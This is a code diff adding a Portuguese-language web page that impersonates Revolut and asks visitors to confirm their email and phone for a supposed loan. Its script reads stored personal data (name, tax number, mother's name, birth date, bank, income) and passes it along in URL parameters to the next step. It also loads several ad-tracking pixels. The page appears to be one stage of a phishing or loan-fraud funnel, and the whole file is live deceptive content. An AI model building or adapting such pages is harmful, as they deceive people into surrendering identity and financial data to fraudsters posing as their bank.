@@ -1,0 +1,301 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+<script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<title>Confirme os seus Dados — Revolut</title>
+<link rel="icon" href="images/revolut-favicon.svg">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{background:#f3f4f6;color:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#0a0a0a;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#0a0a0a}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{font-weight:800;font-size:22px;letter-spacing:-0.5px;margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:lowercase}
+  .user-info .nif{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #0a0a0a;display:flex;align-items:center;justify-content:center}
+  .avatar svg{width:18px;height:18px}
+
+  .card{margin:16px;background:#fff;border-radius:22px;padding:28px 22px;box-shadow:0 1px 2px rgba(0,0,0,.04);flex:1}
+  h1{text-align:center;font-size:22px;font-weight:800;letter-spacing:-.6px;margin-bottom:8px;line-height:1.25}
+  .lead{text-align:center;font-size:14px;color:#52525b;margin-bottom:26px;line-height:1.45}
+
+  .info-box{display:flex;gap:14px;background:#f9fafb;border:1.5px solid #f0f0f3;border-radius:16px;padding:18px 16px;margin-bottom:24px}
+  .info-icon{width:44px;height:44px;min-width:44px;background:#0a0a0a;border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff}
+  .info-icon svg{width:22px;height:22px}
+  .info-title{font-size:14px;font-weight:800;margin-bottom:10px;color:#0a0a0a}
+  .info-list{list-style:none;padding:0;margin:0}
+  .info-list li{display:flex;align-items:flex-start;gap:8px;font-size:13px;color:#52525b;margin-bottom:6px;line-height:1.4}
+  .info-list li:last-child{margin-bottom:0}
+  .check{width:16px;height:16px;min-width:16px;background:#f1ecff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#0a0a0a;margin-top:1px}
+  .check svg{width:10px;height:10px}
+
+  .form-group{margin-bottom:18px}
+  .form-label{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:700;margin-bottom:8px;color:#0a0a0a}
+  .form-label svg{width:18px;height:18px;color:#0a0a0a}
+  .required{color:#ef4444;margin-left:2px}
+  .input-wrap{position:relative}
+  .input-wrap .input-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:20px;height:20px;color:#9ca3af;pointer-events:none}
+  .form-input{width:100%;padding:14px 16px 14px 46px;border:1.5px solid #e5e7eb;border-radius:14px;font-size:15px;font-weight:500;color:#0a0a0a;background:#fff;transition:all .2s ease}
+  .form-input:focus{outline:none;border-color:#0a0a0a;box-shadow:0 0 0 4px rgba(10,10,10,.06)}
+  .form-input::placeholder{color:#9ca3af}
+  .form-input.error{border-color:#ef4444}
+  .error-msg{display:none;margin-top:6px;font-size:12px;color:#ef4444;font-weight:600}
+  .error-msg.show{display:block}
+
+  .phone-row{display:flex;gap:10px}
+  .phone-prefix{display:flex;align-items:center;gap:8px;padding:12px 14px;border:1.5px solid #e5e7eb;border-radius:14px;background:#fff;font-size:15px;font-weight:600;white-space:nowrap}
+  .flag{width:20px;height:14px;border-radius:2px;background:linear-gradient(180deg,#006600 38%,#ff0000 38%);position:relative;overflow:hidden}
+  .flag::after{content:"";position:absolute;left:0;top:0;right:0;bottom:0;background:linear-gradient(135deg,transparent 45%,#ffff00 45%,#ffff00 55%,transparent 55%)}
+  .phone-row .form-input{flex:1}
+  .phone-row .form-input{padding-left:16px}
+
+  .btn-submit{width:100%;background:#0a0a0a;color:#fff;border:none;padding:16px 24px;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:8px;transition:all .2s ease}
+  .btn-submit:active{transform:scale(.98)}
+  .btn-submit svg{width:20px;height:20px}
+
+  .loading-overlay{position:fixed;inset:0;background:rgba(10,10,10,.55);display:none;align-items:center;justify-content:center;z-index:9999;backdrop-filter:blur(3px)}
+  .loading-overlay.show{display:flex}
+  .loading-box{background:#fff;border-radius:22px;padding:36px 32px;text-align:center;max-width:320px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+  .loading-box .spinner{width:54px;height:54px;border:5px solid #f1ecff;border-top-color:#0a0a0a;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 18px}
+  .loading-box .text{font-size:16px;font-weight:700;color:#0a0a0a}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .footer{text-align:center;padding:24px 16px 30px;color:#71717a;font-size:11px;background:#f3f4f6}
+  .footer .l{font-weight:800;color:#0a0a0a;font-size:18px;letter-spacing:-.4px;margin-bottom:6px}
+</style>
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"></div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">cliente</div>
+        <div class="nif" id="userNif">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h1>Confirme os seus Dados de contacto</h1>
+    <div class="lead">Para receber os avisos de pagamento e atualizações sobre o seu empréstimo</div>
+
+    <div class="info-box">
+      <div class="info-icon">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+      </div>
+      <div>
+        <div class="info-title">Irá receber:</div>
+        <ul class="info-list">
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Avisos de pagamento por e-mail</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Avisos de vencimento por SMS</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Atualizações sobre o seu contrato</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Comprovativos de pagamento</li>
+        </ul>
+      </div>
+    </div>
+
+    <form id="contactForm" onsubmit="handleSubmit(event)">
+      <div class="form-group">
+        <label class="form-label" for="emailInput">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          E-mail <span class="required">*</span>
+        </label>
+        <div class="input-wrap">
+          <input autocomplete="email" class="form-input" id="emailInput" placeholder="seu@email.com" required="" type="email">
+          <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        </div>
+        <div class="error-msg" id="emailError">Por favor, insira um e-mail válido</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="phoneInput">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          Telemóvel <span class="required">*</span>
+        </label>
+        <div class="phone-row">
+          <div class="phone-prefix"> +351</div>
+          <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="15" placeholder="911 181 188" required="" type="tel">
+        </div>
+        <div class="error-msg" id="phoneError">Por favor, insira um telemóvel válido</div>
+      </div>
+
+      <button class="btn-submit" id="submitBtn" type="submit">
+        <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        Confirmar e Continuar
+      </button>
+    </form>
+  </div>
+
+  <div class="footer">
+    <div class="l"><img src="images/revolut-logo.svg" alt="Revolut" style="height:32px;width:auto;display:block;margin:0 auto 6px;"></div>
+    <div>Rev Business LTD</div>
+    <div>Avenida da Liberdade, 110 - 1269-046 Lisboa</div>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-box">
+    <div class="spinner"></div>
+    <div class="text">A guardar os seus dados...</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var nome = (localStorage.getItem('nome')||'cliente').trim();
+  var p = nome.split(/\s+/).filter(Boolean);
+  var primeiro = p[0] || 'cliente';
+  var ultimo = p.length > 1 ? p.slice(-1)[0] : '';
+  var exibicao = (primeiro + ' ' + ultimo).trim().toLowerCase();
+  document.getElementById('userName').textContent = exibicao;
+  var nif = (localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/\D/g,'');
+  if(nif.length>=9) document.getElementById('userNif').textContent = nif.slice(0,3)+' *** *'+nif.slice(7,9);
+
+  var savedEmail = localStorage.getItem('email');
+  var savedPhone = localStorage.getItem('telefone') || localStorage.getItem('telephone') || localStorage.getItem('phone');
+  if(savedEmail) document.getElementById('emailInput').value = savedEmail;
+  if(savedPhone) document.getElementById('phoneInput').value = formatPhone(savedPhone);
+
+  document.getElementById('phoneInput').addEventListener('input', function(e){
+    e.target.value = formatPhone(e.target.value.replace(/\D/g,''));
+  });
+
+  document.getElementById('emailInput').addEventListener('blur', function(){ validateEmail(this.value); });
+  document.getElementById('phoneInput').addEventListener('blur', function(){ validatePhone(this.value); });
+
+  function formatPhone(v){
+    v = v.replace(/\D/g,'');
+    if(v.length>9) v = v.slice(0,9);
+    if(v.length<=6) return v.replace(/(\d{3})(\d{0,3})/,'$1 $2').trim();
+    return v.replace(/(\d{3})(\d{3})(\d{0,3})/,'$1 $2 $3').trim();
+  }
+
+  function validateEmail(email){
+    var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    var err = document.getElementById('emailError');
+    var inp = document.getElementById('emailInput');
+    if(!re.test(email)){ inp.classList.add('error'); err.classList.add('show'); return false; }
+    inp.classList.remove('error'); err.classList.remove('show'); return true;
+  }
+
+  function validatePhone(phone){
+    var cl = phone.replace(/\D/g,'');
+    var err = document.getElementById('phoneError');
+    var inp = document.getElementById('phoneInput');
+    if(cl.length < 9){ inp.classList.add('error'); err.classList.add('show'); return false; }
+    inp.classList.remove('error'); err.classList.remove('show'); return true;
+  }
+
+  window.handleSubmit = function(event){
+    event.preventDefault();
+    var email = document.getElementById('emailInput').value.trim();
+    var phone = document.getElementById('phoneInput').value;
+    var phoneClean = phone.replace(/\D/g,'');
+    if(!validateEmail(email) || !validatePhone(phone)) return false;
+    document.getElementById('loadingOverlay').classList.add('show');
+    localStorage.setItem('email', email);
+    localStorage.setItem('telefone', phoneClean);
+    localStorage.setItem('telephone', phoneClean);
+    localStorage.setItem('phone', phoneClean);
+    var urlParams = new URLSearchParams(window.location.search);
+    urlParams.set('email', email);
+    urlParams.set('telephone', phoneClean);
+    var importantParams = ['income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','name','document','nome_mae','data_nasc','dueDate','cpf','nome','banco','selectedLoanAmount','selectedInstallments','selectedMonthlyPayment'];
+    importantParams.forEach(function(param){
+      var value = localStorage.getItem(param);
+      if(value && !urlParams.has(param)) urlParams.set(param, value);
+    });
+    setTimeout(function(){
+      redirectWithParams('configurando-conta.html');
+    }, 1500);
+    return false;
+  };
+})();
+</script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body></html>
